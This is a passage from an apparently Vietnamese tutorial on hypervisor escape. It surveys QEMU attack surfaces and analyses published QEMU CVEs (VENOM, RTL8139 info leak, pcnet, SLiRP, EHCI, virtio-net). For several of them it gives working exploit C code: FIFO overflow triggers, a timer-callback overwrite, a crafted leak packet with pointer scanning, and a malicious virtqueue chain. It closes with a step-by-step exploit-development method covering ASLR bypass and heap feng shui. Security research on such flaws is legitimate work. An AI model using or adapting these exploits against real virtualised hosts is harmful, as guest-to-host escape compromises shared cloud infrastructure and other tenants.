   - VMware SVGA: complex 2D/3D command processing
   - VBox VMSVGA: Chromium-based 3D → massive codebase

2. vGPU (Virtual GPU)
   - NVIDIA vGPU (GRID): GPU firmware + driver attack surface  
   - Intel GVT-g: Mediated passthrough, kernel module
   - AMD MxGPU: SR-IOV based
   
3. GPU Passthrough (full)
   - IOMMU required
   - GPU firmware/ROM is untrusted (loaded by guest)
   - MSI/MSI-X interrupt injection

Tại sao GPU là target tốt:
- Codebase lớn, phức tạp
- Xử lý data structures phức tạp (command buffers, shaders)
- Thiếu sandboxing trong nhiều implementation
- Performance-sensitive → ít bounds checking
```

### 2.6 Network Backend Attack Surface

```c
/*
 * Network stack trong QEMU có nhiều attack surface:
 *
 * 1. SLiRP (User-mode networking, default)
 *    - Full TCP/IP stack trong userspace
 *    - Parse untrusted network packets từ guest
 *    - Nhiều CVE: CVE-2019-6778, CVE-2019-15890, etc.
 *
 * 2. TAP device
 *    - Bridge guest vào host network
 *    - Ít attack surface (kernel handles networking)
 *    
 * 3. vhost-net (kernel)
 *    - Kernel module xử lý virtio-net dataplane
 *    - Attack surface trong kernel (nguy hiểm hơn)
 *
 * 4. vhost-user
 *    - Userspace process (DPDK, etc.) xử lý packets
 *    - Shared memory giữa QEMU và vhost process
 */
```

---

## Phần 3: QEMU/KVM Escape — Từ cơ bản đến nâng cao

### 3.1 Kiến trúc QEMU — Cần hiểu để exploit

```c
/*
 * QEMU Memory Layout (quan trọng cho exploit):
 *
 * QEMU process (userspace):
 *   Text segment:  QEMU code
 *   Data/BSS:      Global state
 *   Heap:          Guest RAM mapped here! + device state
 *   mmap:          Guest RAM (thường mmap anonymous)
 *   Stack:         Thread stacks
 *
 * Guest RAM là memory mapping trong QEMU address space.
 * → Guest BIẾT vị trí physical memory của mình trong QEMU heap
 * → Nếu có info leak → tính được QEMU heap layout
 * → Nếu có write primitive → ghi vào QEMU code/data
 *
 * MemoryRegion hierarchy:
 *   system_memory (0x0000000000000000 - )
 *   ├── ram (0x0000000000000000 - guest_ram_size)
 *   ├── pci-mmio (0x00000000C0000000 - )
 *   │   ├── e1000-mmio (BAR0 address)
 *   │   ├── vga-vram (0x00000000A0000 - )
 *   │   └── ...
 *   └── pci-io (0x0000000000000000 - 0xFFFF)
 *       ├── ide-ioport (0x1F0 - 0x1F7)
 *       ├── fdc-ioport (0x3F0 - 0x3F5)
 *       └── ...
 */

/* QEMU AddressSpace structure */
typedef struct AddressSpace {
    MemoryRegion *root;
    FlatView *current_map;      /* Flattened view of memory regions */
    /* ... */
} AddressSpace;

typedef struct MemoryRegion {
    Object parent;
    const MemoryRegionOps *ops; /* Read/Write callbacks ← device handler */
    void *opaque;               /* Device state */
    uint64_t size;
    hwaddr addr;                /* Base address */
    ram_addr_t ram_block_offset;
    /* ... */
} MemoryRegion;

/* Mỗi device đăng ký callbacks cho I/O access */
typedef struct MemoryRegionOps {
    uint64_t (*read)(void *opaque, hwaddr addr, unsigned size);
    void (*write)(void *opaque, hwaddr addr, uint64_t data, unsigned size);
    /* ... */
} MemoryRegionOps;
```

#### QEMU Object Model (QOM) — Hiểu device structure

```c
/*
 * Mỗi device trong QEMU là một QOM object.
 * Ví dụ: RTL8139 NIC
 */
typedef struct RTL8139State {
    PCIDevice dev;          /* PCI device base */
    
    /* NIC registers — guest đọc/ghi trực tiếp */
    uint8_t  phys[8];      /* MAC address */
    uint8_t  mult[8];      /* Multicast filter */
    
    uint32_t TxStatus[4];  /* Transmit status registers */
    uint32_t TxAddr[4];    /* Transmit buffer addresses — GUEST CONTROLLED */
    uint32_t RxBuf;        /* Receive buffer address — GUEST CONTROLLED */
    
    uint32_t RxBufferSize; /* Computed from RCR */
    
    /* Internal state */
    uint8_t  *cplus_txbuffer;
    int      cplus_txbuffer_len;
    int      cplus_txbuffer_offset;
    
    /* ... nhiều fields khác */
    
    NICState *nic;
    NICConf  conf;
    MemoryRegion bar_io;   /* I/O BAR */
    MemoryRegion bar_mem;  /* Memory BAR */
} RTL8139State;
```

### 3.2 CVE-2015-3456 — VENOM (Virtualized Environment Neglected Operations Manipulation)

**Severity**: Critical — Guest-to-Host Escape  
**Affected**: QEMU, Xen, KVM, VirtualBox  
**Root cause**: Buffer overflow trong Floppy Disk Controller (FDC) emulation  
**Discovered by**: Jason Geffner, CrowdStrike

#### Phân tích vulnerability

```c
/*
 * File: hw/block/fdc.c (QEMU source)
 * 
 * FDC có FIFO buffer 512 bytes và con trỏ data_pos.
 * Bug: khi ghi data vào FIFO, data_pos không bao giờ được reset
 * trong một số code paths → overflow vượt qua 512 bytes.
 */

/* FDC State structure */
typedef struct FDCtrl {
    /* ... */
    
    /* FIFO */
    uint8_t fifo[FD_SECTOR_LEN];  /* 512 bytes */
    uint32_t data_pos;             /* current position in FIFO */
    uint32_t data_len;             /* expected data length */
    uint8_t data_state;            /* state of data transfer */
    uint8_t data_dir;              /* direction: read/write */
    
    /* ... */
} FDCtrl;

/*
 * VULNERABLE CODE (simplified):
 * fdctrl_write() xử lý guest ghi vào FDC I/O port
 */
static void fdctrl_write(void *opaque, hwaddr reg, uint64_t value, 
                          unsigned size) {
    FDCtrl *s = opaque;
    
    switch (reg) {
    case FD_REG_FIFO:  /* Port 0x3F5 */
        fdctrl_write_data(s, value);
        break;
    /* ... */
    }
}

static void fdctrl_write_data(FDCtrl *fdctrl, uint32_t value) {
    /* ... */
    
    if (fdctrl->data_pos == 0) {
        /* First byte = command */
        fdctrl->cur_cmd = value;
        /* ... set up data_len based on command */
    }
    
    /* BUG: Ghi vào FIFO tại data_pos, nhưng... */
    fdctrl->fifo[fdctrl->data_pos] = value;  /* <-- OVERFLOW! */
    
    if (++fdctrl->data_pos == fdctrl->data_len) {
        /* Command complete, process it */
        fdctrl_handle_command(fdctrl);
        /* ... nhưng một số commands KHÔNG reset data_pos!!! */
    }
    
    /*
     * Bug cụ thể: FD_CMD_RELATIVE_SEEK_OUT, FD_CMD_RELATIVE_SEEK_IN
     * và một vài command khác gọi fdctrl_unimplemented() mà không
     * reset data_pos về 0.
     * 
     * Kết quả: gửi một unimplemented command, data_pos vẫn tăng,
     * sau đó gửi command tiếp → ghi tiếp vào fifo[data_pos] 
     * mà data_pos > 512!
     */
}
```

#### Exploit VENOM — Full Code

```c
/*
 * venom_exploit.c — PoC exploit cho CVE-2015-3456
 * Chạy trong guest VM (cần root/admin để access I/O ports)
 * 
 * Strategy:
 * 1. Gửi unimplemented FDC command để "stick" data_pos
 * 2. Tiếp tục ghi để overflow FDC FIFO buffer
 * 3. Overwrite adjacent memory trong QEMU process
 * 4. Control flow hijack
 *
 * Compile: gcc -O0 -o venom venom_exploit.c
 * Run: sudo ./venom (hoặc với ioperm/iopl)
 */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/io.h>
#include <unistd.h>

/* FDC I/O Ports */
#define FDC_BASE       0x3F0
#define FDC_DOR        (FDC_BASE + 2)  /* Digital Output Register */
#define FDC_MSR        (FDC_BASE + 4)  /* Main Status Register */
#define FDC_FIFO       (FDC_BASE + 5)  /* Data/FIFO register */
#define FDC_CCR        (FDC_BASE + 7)  /* Config Control Register */

/* FDC Commands */
#define FDC_CMD_SENSE_INTERRUPT  0x08
#define FDC_CMD_RELATIVE_SEEK   0x8F  /* Unimplemented → doesn't reset pos */
#define FDC_CMD_READ_ID          0x0A

/* MSR flags */
#define MSR_RQM  0x80  /* Request for Master - FDC ready for data */
#define MSR_DIO  0x40  /* Data I/O direction */
#define MSR_CB   0x10  /* Controller Busy */

static void fdc_wait_ready(void) {
    int timeout = 10000;
    while (timeout--) {
        uint8_t msr = inb(FDC_MSR);
        if (msr & MSR_RQM)
            return;
        usleep(10);
    }
    fprintf(stderr, "[-] FDC timeout waiting for ready\n");
}

static void fdc_write_byte(uint8_t byte) {
    fdc_wait_ready();
    outb(byte, FDC_FIFO);
}

static void fdc_reset(void) {
    /* Reset FDC */
    outb(0x00, FDC_DOR);  /* Disable controller */
    usleep(100);
    outb(0x0C, FDC_DOR);  /* Enable controller + DMA */
    usleep(100);
    
    /* Clear any pending interrupts */
    for (int i = 0; i < 4; i++) {
        fdc_write_byte(FDC_CMD_SENSE_INTERRUPT);
        fdc_wait_ready();
        inb(FDC_FIFO); /* ST0 */
        fdc_wait_ready();
        inb(FDC_FIFO); /* PCN */
    }
}

/*
 * Bước 1: Gửi unimplemented command để data_pos không bị reset
 */
static void fdc_trigger_stuck_pos(void) {
    /* 
     * FD_CMD_RELATIVE_SEEK_OUT (0x8F) expects 2 bytes total:
     * byte 0: command (0x8F)
     * byte 1: drive/head
     * Nhưng handler gọi fdctrl_unimplemented() 
     * → KHÔNG reset data_pos về 0!
     */
    fdc_write_byte(FDC_CMD_RELATIVE_SEEK);  /* Command byte → data_pos = 0 */
    fdc_write_byte(0x00);                    /* Argument → data_pos = 1 */
    /* fdctrl_unimplemented() called, result phase entered */
    /* data_pos is now stuck at some value, NOT reset to 0 */
}

/*
 * Bước 2: Overflow FIFO buffer
 */
static void fdc_overflow_fifo(uint8_t *payload, size_t len) {
    printf("[*] Overflowing FDC FIFO with %zu bytes...\n", len);
    
    /*
     * Sau khi data_pos bị stuck, tiếp tục ghi vào FIFO port
     * sẽ ghi tại fifo[data_pos++] mà không có bounds check
     * 
     * Bytes 0-511: trong fifo buffer (hợp lệ)
     * Bytes 512+: OVERFLOW vào adjacent memory!
     */
    for (size_t i = 0; i < len; i++) {
        fdc_write_byte(payload[i]);
    }
}

/*
 * Bước 3: Xác định target cho overflow
 * 
 * Trong QEMU, FDCtrl struct nằm trên heap.
 * Adjacent memory có thể chứa:
 * - Function pointers (QEMUTimer callbacks)
 * - MemoryRegion ops pointers
 * - Các device state khác
 *
 * Layout phụ thuộc vào QEMU version và heap state.
 * Cần info leak trước để biết chính xác layout.
 */
static void build_payload(uint8_t *buf, size_t buflen) {
    memset(buf, 'A', buflen);  /* Fill pattern */
    
    /*
     * Trong thực tế, payload cần:
     * 1. Info leak (xem phần 3.3) để biết QEMU base address
     * 2. ROP chain hoặc shellcode address
     * 3. Overwrite function pointer gần FIFO buffer
     *
     * Target phổ biến (QEMU 2.x):
     *   FDCtrl.result_timer → QEMUTimer chứa callback function pointer
     *   Overwrite callback → code execution khi timer fires
     */
    
    /* Offset đến QEMUTimer callback (version dependent) */
    size_t timer_offset = 568;  /* Example offset, cần tính cho target cụ thể */
    
    if (timer_offset + 8 <= buflen) {
        /* Overwrite timer callback with controlled address */
        uint64_t target_addr = 0x4141414142424242ULL;  /* Placeholder */
        memcpy(buf + timer_offset, &target_addr, 8);
    }
}

int main(void) {
    printf("[*] VENOM PoC — CVE-2015-3456\n");
    printf("[*] FDC FIFO Buffer Overflow\n\n");
    
    /* Cần root để access I/O ports */
    if (iopl(3) != 0) {
        perror("iopl");
        printf("[-] Need root privileges\n");
        return 1;
    }
    
    printf("[+] I/O privilege level set\n");
    
    /* Reset FDC to known state */
    fdc_reset();
    printf("[+] FDC reset complete\n");
    
    /* Trigger bug: make data_pos stuck */
    fdc_trigger_stuck_pos();
    printf("[+] data_pos stuck (not reset)\n");
    
    /* Build overflow payload */
    uint8_t payload[1024];
    build_payload(payload, sizeof(payload));
    
    /* Overflow! */
    fdc_overflow_fifo(payload, sizeof(payload));
    printf("[+] Overflow sent\n");
    
    printf("[*] If QEMU crashes or hangs, the overflow worked.\n");
    printf("[*] For full exploit, need info leak + precise offset.\n");
    
    return 0;
}
```

### 3.3 CVE-2015-5165 — RTL8139 Information Leak

**Tại sao cần info leak**: ASLR trong QEMU process randomize base address. Cần leak QEMU heap/text address trước khi overwrite function pointer.

```c
/*
 * rtl8139_leak.c — Information leak qua RTL8139 C+ mode
 * 
 * Bug: RTL8139 C+ transmit mode cho phép guest chỉ định
 * buffer address và length cho TX. QEMU đọc data từ guest memory
 * vào internal buffer, nhưng không kiểm tra IP header length đúng.
 * 
 * Khi TCP checksum offload được bật, QEMU đọc IP total_length
 * từ packet header (guest controlled), dùng nó để tính checksum
 * trên buffer dài hơn actual packet → leak QEMU heap data!
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>

/* PCI BAR cho RTL8139 — đọc từ /sys/bus/pci/devices/... */
#define RTL8139_MMIO_BASE  0xfebf1000  /* Example, lấy từ lspci */

/* RTL8139 Registers */
#define RTL_TxAddr0     0x20
#define RTL_TxStatus0   0x10
#define RTL_ChipCmd     0x37
#define RTL_TxConfig    0x40
#define RTL_RxConfig    0x44
#define RTL_CPCR        0xE0  /* C+ Command Register */
#define RTL_TxDescAddr  0x20  /* C+ TX Descriptor Address (low) */
#define RTL_TxDescAddrH 0x24  /* C+ TX Descriptor Address (high) */

/* C+ TX Descriptor */
struct rtl8139_cp_tx_desc {
    uint32_t opts1;   /* OWN | EOR | FS | LS | length */
    uint32_t opts2;   /* VLAN tag, checksum offload flags */
    uint32_t buf_lo;  /* Buffer physical address low */
    uint32_t buf_hi;  /* Buffer physical address high */
} __attribute__((packed));

#define CP_TX_OWN    (1U << 31)
#define CP_TX_EOR    (1U << 30)  /* End of Ring */
#define CP_TX_FS     (1U << 29)  /* First Segment */
#define CP_TX_LS     (1U << 28)  /* Last Segment */
#define CP_TX_IPCS   (1U << 18)  /* IP Checksum offload */
#define CP_TX_TCPCS  (1U << 16)  /* TCP Checksum offload */

/*
 * Crafted packet để trigger info leak:
 * - IP header với total_length = 0xFFFF (max)
 * - TCP checksum offload enabled
 * - Actual buffer nhỏ hơn nhiều
 * 
 * QEMU sẽ:
 * 1. Đọc packet data từ guest (nhỏ, vd 100 bytes)
 * 2. Đọc IP total_length = 0xFFFF từ packet header
 * 3. Tính TCP checksum trên 0xFFFF bytes
 * 4. Gửi cả packet ra network → bytes sau packet data
 *    là QEMU heap data!
 */

static uint8_t *build_leak_packet(size_t *out_len) {
    size_t pkt_len = 100; /* actual packet size */
    uint8_t *pkt = calloc(1, pkt_len);
    
    /* Ethernet header */
    memset(pkt, 0xFF, 6);      /* dst MAC: broadcast */
    memset(pkt + 6, 0xAA, 6);  /* src MAC */
    pkt[12] = 0x08; pkt[13] = 0x00; /* EtherType: IPv4 */
    
    /* IP header (offset 14) */
    uint8_t *ip = pkt + 14;
    ip[0] = 0x45;              /* Version=4, IHL=5 (20 bytes) */
    ip[1] = 0x00;              /* DSCP/ECN */
    /* total_length: FAKE large value → leak! */
    ip[2] = 0xFF;              /* Total length high */
    ip[3] = 0xFF;              /* Total length low = 65535 */
    ip[4] = 0x00; ip[5] = 0x01; /* Identification */
    ip[6] = 0x00; ip[7] = 0x00; /* Flags/Fragment */
    ip[8] = 0x40;              /* TTL = 64 */
    ip[9] = 0x06;              /* Protocol: TCP */
    ip[10] = 0x00; ip[11] = 0x00; /* Header checksum (will be calculated) */
    /* Source IP: 10.0.2.15 */
    ip[12] = 10; ip[13] = 0; ip[14] = 2; ip[15] = 15;
    /* Dest IP: 10.0.2.1 */
    ip[16] = 10; ip[17] = 0; ip[18] = 2; ip[19] = 1;
    
    /* TCP header (offset 34) */
    uint8_t *tcp = pkt + 34;
    tcp[0] = 0x00; tcp[1] = 0x50;  /* src port 80 */
    tcp[2] = 0x00; tcp[3] = 0x51;  /* dst port 81 */
    tcp[12] = 0x50;                 /* Data offset = 5 (20 bytes) */
    tcp[13] = 0x02;                 /* SYN */
    
    *out_len = pkt_len;
    return pkt;
}

/*
 * Capture leaked data:
 * Chạy tcpdump trên guest's network interface hoặc
 * trên host's TAP/bridge interface để capture packets
 * lớn hơn 100 bytes → phần dư là QEMU heap data
 *
 * tcpdump -i tap0 -w leak.pcap -s 65535
 * Hoặc từ guest: tcpdump -i eth0 -w leak.pcap -s 65535
 */

void analyze_leak(uint8_t *captured_pkt, size_t captured_len, size_t original_len) {
    if (captured_len <= original_len) {
        printf("[-] No leak detected\n");
        return;
    }
    
    size_t leaked = captured_len - original_len;
    printf("[+] Leaked %zu bytes of QEMU heap!\n", leaked);
    
    uint8_t *leak_data = captured_pkt + original_len;
    
    /* Scan for potential pointers (look for 0x7f or 0x55 prefix on 64-bit) */
    for (size_t i = 0; i + 8 <= leaked; i += 8) {
        uint64_t val = *(uint64_t *)(leak_data + i);
        
        /* Typical QEMU text segment address (PIE) */
        if ((val >> 40) == 0x55 || (val >> 40) == 0x56) {
            printf("[!] Potential QEMU text ptr at offset %zu: 0x%016lx\n", i, val);
        }
        
        /* Typical heap address */
        if ((val >> 40) == 0x7f) {
            printf("[!] Potential heap/lib ptr at offset %zu: 0x%016lx\n", i, val);
        }
    }
}

int main(void) {
    printf("[*] CVE-2015-5165 — RTL8139 Information Leak\n");
    printf("[*] Need to set up C+ TX ring and send crafted packet\n");
    printf("[*] Then capture on network to see leaked QEMU heap data\n");
    
    /* 
     * Full exploit flow:
     * 1. Map PCI BAR (MMIO) cho RTL8139
     * 2. Enable C+ mode
     * 3. Set up TX descriptor ring
     * 4. Build crafted packet with large IP total_length
     * 5. Submit TX descriptor → QEMU reads & sends oversized packet
     * 6. Capture packet → extract QEMU heap data
     * 7. Parse pointers to defeat ASLR
     */
    
    return 0;
}
```

### 3.4 CVE-2015-7504 — pcnet (Am79C970A) Buffer Overflow

```c
/*
 * pcnet_exploit.c — Heap overflow trong pcnet NIC emulation
 *
 * Bug: pcnet_receive() không kiểm tra size khi copy packet vào buffer
 * 
 * File: hw/net/pcnet.c
 * 
 * static ssize_t pcnet_receive(NetClientState *nc, const uint8_t *buf, 
 *                               size_t size) {
 *     ...
 *     // s->buffer là 4096 bytes
 *     // Khi loopback mode + CRC append:
 *     //   memcpy(s->buffer, buf, size);  // size từ guest TX
 *     //   s->buffer[size++] = crc;       // +4 bytes CRC
 *     //   Nếu size == 4096 → CRC ghi tại buffer[4096..4099] → OVERFLOW
 *     ...
 * }
 */

/* pcnet state — target structure */
typedef struct PCNetState {
    /* ... nhiều fields ... */
    
    uint8_t buffer[4096];  /* RX/TX buffer */
    
    /* Fields ngay sau buffer — bị overwrite khi overflow! */
    QEMUTimer *poll_timer;      /* Timer callback → code execution! */
    /* ... */
    
    int tx_busy;
    int loopback;  /* Cần enable để trigger bug */
    /* ... */
} PCNetState;

/*
 * Exploit strategy:
 * 1. Enable pcnet loopback mode (ghi vào CSR register)
 * 2. Gửi packet 4096 bytes qua TX → triggers loopback receive
 * 3. pcnet_receive() appends 4-byte CRC → overflows buffer
 * 4. CRC overwrites bytes ngay sau buffer
 * 5. Nếu poll_timer ở đúng offset → overwrite timer callback
 * 6. Khi timer fires → code execution trong QEMU process
 *
 * Cần info leak trước để biết:
 * - QEMU text base (cho ROP gadgets)
 * - Heap layout (cho target address)
 */

/* Trigger loopback mode */
static void pcnet_enable_loopback(volatile uint8_t *mmio_base) {
    /*
     * PCnet CSR15 (Mode register): bit 0 = PROM (promiscuous)
     * BCR32: bit 1 = SSIZE32 (32-bit software structure)
     * CSR4: bit 14 = TXSTRTM
     * 
     * Set loopback via CSR15 mode bits hoặc BCR32
     */
    
    /* RAP (Register Address Port) = chọn register */
    /* RDP (Register Data Port) = đọc/ghi data */
    
    /* Cần init sequence cụ thể cho pcnet... */
    /* (simplified) */
}

static void pcnet_send_overflow_packet(volatile uint8_t *mmio_base) {
    /* 
     * Tạo TX descriptor pointing to 4096-byte buffer
     * Khi loopback, QEMU:
     * 1. Đọc 4096 bytes từ TX buffer (guest memory)
     * 2. Copy vào s->buffer (4096 bytes) → fits exactly
     * 3. Appends 4 bytes CRC → s->buffer[4096..4099] OVERFLOW!
     *
     * 4 bytes CRC là CRC32 của packet data → partially controlled
     * Vì CRC là deterministic function of packet content,
     * ta có thể brute force packet content sao cho CRC = target value
     */
    
    uint8_t packet[4096];
    
    /* Fill packet với carefully chosen data
     * sao cho CRC32(packet) = desired overwrite value */
    memset(packet, 0x00, sizeof(packet));
    
    /*
     * Để control 4 bytes overwrite:
     * - Thay đổi 4 bytes cuối packet
     * - CRC32 reversible: cho target CRC, tính 4 bytes cần append
     * - Dùng CRC32 compensation technique
     */
}
```

### 3.5 CVE-2019-6778 — SLiRP Heap Buffer Overflow

```c
/*
 * slirp_exploit.c — Heap overflow trong SLiRP TCP reassembly
 *
 * SLiRP = user-mode network stack (default khi dùng -netdev user)
 * Bug: tcp_emu() xử lý IP packet reassembly không đúng
 * 
 * File: slirp/src/tcp_subr.c
 *
 * Khi guest gửi fragmented TCP data qua SLiRP,
 * tcp_emu() có thể ghi nhiều data hơn buffer size
 */

/*
 * Vulnerable code pattern (simplified):
 * 
 * int tcp_emu(struct socket *so, struct mbuf *m) {
 *     ...
 *     // m->m_data points to TCP payload
 *     // m->m_len = payload length
 *     
 *     while (...) {
 *         // Copy data vào socket buffer
 *         sbappend(so, m);  // <-- doesn't check total accumulated size!
 *         
 *         // Hoặc trực tiếp:
 *         memcpy(so->so_rcv.sb_wptr, data, len);
 *         so->so_rcv.sb_wptr += len;
 *         so->so_rcv.sb_cc += len;
 *         // sb_cc có thể > sb_datalen → OVERFLOW
 *     }
 * }
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

/*
 * Exploit flow:
 * 1. Guest tạo TCP connection qua SLiRP (default gateway 10.0.2.2)
 * 2. Gửi nhiều segments nhỏ, trigger tcp_emu() reassembly
 * 3. Accumulated data > socket buffer → heap overflow trong QEMU
 * 4. Overwrite adjacent heap chunks → arbitrary code execution
 *
 * Heap feng shui:
 * - Trước khi trigger, allocate/free để control heap layout
 * - Đặt target object (vd QEMUTimer) ngay sau socket buffer
 */

#define SLIRP_GATEWAY "10.0.2.2"
#define TARGET_PORT   6667   /* IRC port triggers specific tcp_emu() path */

void trigger_slirp_overflow(void) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("socket");
        return;
    }
    
    struct sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(TARGET_PORT);
    inet_aton(SLIRP_GATEWAY, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        perror("connect");
        close(sock);
        return;
    }
    
    printf("[+] Connected to SLiRP gateway\n");
    
    /*
     * Gửi dữ liệu trigger tcp_emu() overflow
     * Pattern: nhiều fragments nhỏ accumulate vượt buffer size
     */
    char payload[256];
    memset(payload, 'A', sizeof(payload));
    
    for (int i = 0; i < 100; i++) {
        /* Mỗi send() → tcp_emu() append vào socket buffer */
        if (send(sock, payload, sizeof(payload), 0) < 0) {
            printf("[*] Connection closed after %d sends\n", i);
            break;
        }
        usleep(1000);
    }
    
    printf("[*] Overflow data sent\n");
    close(sock);
}

int main(void) {
    printf("[*] CVE-2019-6778 — SLiRP Heap Overflow\n");
    trigger_slirp_overflow();
    return 0;
}
```

### 3.6 CVE-2020-14364 — USB EHCI Out-of-Bounds

```c
/*
 * usb_ehci_exploit.c — OOB read/write trong USB EHCI emulation
 *
 * Bug: EHCI controller xử lý Transfer Descriptors (TDs) 
 * không validate buffer pointer offset đúng.
 *
 * File: hw/usb/hcd-ehci.c
 *
 * Khi process TD chain, QEMU đọc TD từ guest memory.
 * TD chứa buffer pointer và length (guest controlled).
 * EHCI code có internal buffer, copy data based on TD params.
 * Sai validation → OOB access.
 */

/* EHCI Transfer Descriptor structure (từ USB spec) */
struct ehci_qtd {
    uint32_t next;           /* Next qTD pointer */
    uint32_t altnext;        /* Alternate next qTD */
    uint32_t token;          /* Status, PID, Total bytes to transfer, etc. */
    uint32_t bufptr[5];      /* Buffer pointers (page-aligned) + offset */
};

/* 
 * Vulnerable pattern (simplified):
 *
 * static int ehci_execute(EHCIQueue *q, EHCIqtd *qtd) {
 *     ...
 *     uint32_t tbytes = (qtd->token >> 16) & 0x7FFF;  // Total bytes
 *     uint32_t cpage = (qtd->token >> 12) & 0x7;       // Current page
 *     uint32_t offset = qtd->bufptr[0] & 0xFFF;        // Buffer offset
 *     
 *     // BUG: offset + tbytes có thể > internal buffer size
 *     // Nhưng check chỉ kiểm tra tbytes, không kiểm tra offset
 *     
 *     for (i = cpage; i < 5 && remaining > 0; i++) {
 *         uint32_t addr = (qtd->bufptr[i] & ~0xFFF) | offset;
 *         uint32_t chunk = MIN(remaining, 0x1000 - offset);
 *         
 *         // Nếu setup transfer: read từ internal buffer
 *         memcpy(guest_ptr, &q->buffer[buf_offset], chunk);  // OOB!
 *         
 *         buf_offset += chunk;
 *         offset = 0;  // Only first page has offset
 *         remaining -= chunk;
 *     }
 * }
 *
 * Attack: set offset sao cho buf_offset vượt q->buffer boundary
 */

/*
 * Exploit cần:
 * 1. Enable USB EHCI controller trong guest (lsusb, load ehci-hcd)
 * 2. Tìm EHCI MMIO BAR address
 * 3. Setup Queue Head + Transfer Descriptors trong guest memory
 * 4. Craft TD với malicious buffer pointer/offset
 * 5. Trigger EHCI processing → OOB read/write
 *
 * USB exploits phức tạp hơn NIC exploits vì USB protocol phức tạp.
 * Cần hiểu USB spec (EHCI, xHCI) rất kỹ.
 */
```

### 3.7 CVE-2021-3947 — virtio-net Buffer Overflow

```c
/*
 * Virtio-net device trong QEMU: modern virtio NIC
 * Bug: OOB read khi xử lý virtio descriptors
 *
 * Virtio descriptor chain có thể chứa nhiều buffers.
 * QEMU iterate qua chain, accumulate data.
 * Nếu total length vượt expected → OOB
 *
 * Exploit pattern cho virtio devices:
 * 1. Guest driver controls virtqueue descriptors
 * 2. Descriptors chứa {guest_addr, length, flags}  
 * 3. QEMU đọc descriptors → thực hiện DMA read/write
 * 4. Chain length validation sai → overflow
 */

/* Virtio exploit helper — đọc/ghi PCI config + MMIO */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

/* Virtio PCI registers */
#define VIRTIO_PCI_HOST_FEATURES   0x00
#define VIRTIO_PCI_GUEST_FEATURES  0x04
#define VIRTIO_PCI_QUEUE_PFN       0x08
#define VIRTIO_PCI_QUEUE_NUM       0x0C
#define VIRTIO_PCI_QUEUE_SEL       0x0E
#define VIRTIO_PCI_QUEUE_NOTIFY    0x10
#define VIRTIO_PCI_STATUS          0x12
#define VIRTIO_PCI_ISR             0x13

/* Virtio status bits */
#define VIRTIO_STATUS_ACK          0x01
#define VIRTIO_STATUS_DRIVER       0x02
#define VIRTIO_STATUS_DRIVER_OK    0x04
#define VIRTIO_STATUS_FEATURES_OK  0x08

struct vring_desc {
    uint64_t addr;
    uint32_t len;
    uint16_t flags;
    uint16_t next;
} __attribute__((packed));

#define VRING_DESC_F_NEXT     0x1
#define VRING_DESC_F_WRITE    0x2
#define VRING_DESC_F_INDIRECT 0x4

struct vring_avail {
    uint16_t flags;
    uint16_t idx;
    uint16_t ring[];
} __attribute__((packed));

struct vring_used_elem {
    uint32_t id;
    uint32_t len;
} __attribute__((packed));

struct vring_used {
    uint16_t flags;
    uint16_t idx;
    struct vring_used_elem ring[];
} __attribute__((packed));

/*
 * Malicious virtio descriptor chain:
 * 
 * desc[0]: addr=legit_buf, len=100, flags=NEXT, next=1
 * desc[1]: addr=legit_buf, len=100, flags=NEXT, next=2
 * ...
 * desc[N]: addr=legit_buf, len=HUGE_VALUE, flags=0, next=0
 *
 * QEMU processes chain, reads len bytes from each descriptor.
 * Total > internal buffer → overflow
 */

void setup_malicious_virtqueue(volatile void *mmio, void *vring_mem, 
                                uint64_t vring_phys) {
    struct vring_desc *desc = (struct vring_desc *)vring_mem;
    
    /* Build descriptor chain that overflows */
    for (int i = 0; i < 15; i++) {
        desc[i].addr = vring_phys + 4096;  /* Data buffer GPA */
        desc[i].len = 4096;
        desc[i].flags = VRING_DESC_F_NEXT;
        desc[i].next = i + 1;
    }
    /* Last descriptor: enormous length */
    desc[15].addr = vring_phys + 4096;
    desc[15].len = 0xFFFF;  /* 64KB — likely > QEMU internal buffer */
    desc[15].flags = 0;
    desc[15].next = 0;
    
    /* Set up available ring */
    struct vring_avail *avail = (struct vring_avail *)((char *)vring_mem + 
                                 256 * sizeof(struct vring_desc));
    avail->flags = 0;
    avail->idx = 1;
    avail->ring[0] = 0;  /* First descriptor in chain */
    
    /* Notify device to process queue */
    /* *(volatile uint16_t *)(mmio + VIRTIO_PCI_QUEUE_NOTIFY) = 0; */
}
```

### 3.8 Viết Exploit QEMU từ đầu — Phương pháp luận

```
┌─────────────────────────────────────────────────────┐
│            QEMU Exploit Development Flow            │
│                                                      │
│  Step 1: Chọn Target Device                         │
│  ├── Xem QEMU command line: -device xxx             │
│  ├── Đọc source code device (hw/xxx/)               │
│  └── Map tất cả I/O handlers (read/write callbacks) │
│                                                      │
│  Step 2: Tìm Bug                                    │
│  ├── Manual code audit (pattern matching)           │
│  │   ├── memcpy() với size từ guest                 │
│  │   ├── Buffer access không bounds check           │
│  │   ├── Integer overflow trong size calculation    │
│  │   ├── Use-after-free trong timer/callback        │
│  │   └── Type confusion                             │
│  ├── Fuzzing (xem Phần 10)                          │
│  └── Diff analysis (security patches)              │
│                                                      │
│  Step 3: Viết Trigger                               │
│  ├── Viết guest program để trigger bug              │
│  ├── Cần: I/O port access hoặc MMIO mapping         │
│  ├── Linux: iopl(3) + inb/outb hoặc mmap /dev/mem  │
│  └── Confirm crash trong QEMU (ASAN build)          │
│                                                      │
│  Step 4: Info Leak (bypass ASLR)                    │
│  ├── Tìm info leak trong cùng device hoặc khác     │
│  ├── Leak QEMU text base → ROP gadgets              │
│  ├── Leak heap address → target for overwrite       │
│  └── Leak libc address → system()/mprotect()        │
│                                                      │
│  Step 5: Build Exploit                              │
│  ├── Heap feng shui (control heap layout)           │
│  │   ├── Allocate objects trước target              │
│  │   ├── Free để tạo "holes"                        │
